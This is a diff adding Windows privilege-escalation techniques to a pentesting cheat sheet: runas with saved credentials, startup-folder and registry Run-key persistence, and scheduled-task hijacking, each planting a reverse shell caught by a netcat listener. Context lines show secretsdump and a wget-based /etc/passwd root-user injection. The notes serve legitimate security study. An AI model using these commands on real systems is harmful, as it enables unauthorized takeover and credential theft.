@@ -786,6 +786,32 @@ whoami
 - Precondition check: 'icalcs "C:\Program Files\Unquoted Path Service"', to check that BUILTIN\Users has WRITE permission
 - Exploitation: if the path is 'C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe', then craft reverse shell exploit called common.exe and place in any of the sub directories in C:\Program Files\Unquoted Path Service\Common Files . To trigger the exploit use 'net start *ServiceName*' and then run netcat listener on kali.
 
+11. runas
+- https://juggernaut-sec.com/runas/
+- If an attacker identifies stored credential entry for an administrator account then the attacker can go for privilege escalation by executing a malicious file with the help of runas utility.
+- Detection: Find stored credential using 'cmdkey /list', look out for Administrator credential stored in Credential Manager
+- Exploitation: craft a reverse shell payload and send to victim while you start nc on kali. Once runas is finished, you will get reverse shell as Admin
+```bash
+1. runas /savecred /user:WORKGROUP\Administrator "C:\Users\ignite\Downloads\shell.exe" OR
+2. runas /env /noprofile /savecred /user:JUGG-efrost\administrator "cmd.exe /c whoami > whoami.txt"
+```
+
+12. Boot Logon Autostart Execution (Startup Folder)
+- Adding an application to a startup folder or referencing it using a Registry run key are two ways to do this.
+- Detection 1: icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin)
+- Detection 2: accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin)
+- Exploitation: Craft and send reverse shell payload while starting nc listener on kali. Put the reverse shell payload in StartUp folder and do a reboot and log on with the [USER] login.
+
+13.  Boot Logon Autostart Execution (Registry Run Keys)
+- Run and RunOnce registry keys cause programs to run each time a user logs on. The Run registry keys will run the task every time there’s a login. The RunOnce registry keys will run the tasks once and then delete that key. Then there is Run and RunOnce; the only difference is that RunOnce will automatically delete the entry upon successful execution.
+- Detection: WinPEAS (under Autorun Applications)
+- Exploitation: Replace the file in the folder with Full/all access by Authenticated Users, with reverse shell payload of the same name. Reboot and relogin to trigger the autostart.
+
+14. Scheduled Task/Job
+- Detection 1: WinPEAS (under scheduled task), ensure that 'scheduled task state = enabled' and 'schedule type = daily' and 'repeat every = 5 min e.g.)
+- Detection 2: 'schtasks /query /fo LIST /v', ensure that 'scheduled task state = enabled' and 'schedule type = daily' and 'repeat every = 5 min e.g.)
+- Exploitation: Replace the file found in "Task to Run" with reverse shell payload using 'echo path_to_shell >> path_to_scheduled_script', while setting up nc listener on kali. 
+- Exploitation on (Windows 2000, XP, or 2003), we can try creating a New Scheduled Task
 
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
@@ -1573,6 +1599,7 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 - to run binary program, can specify '/home' instead of current directory '.'
 - [if SUID bit set for cp, we can add a new user with root privileges to /etc/passwd file] to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignite:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
 - admin to give SUID permission to nano: 'chmod u+s /bin/nano'
+- if WinPEAS failed i.e. Error, try using Seatbelt
 
 ## MSFVenom
 
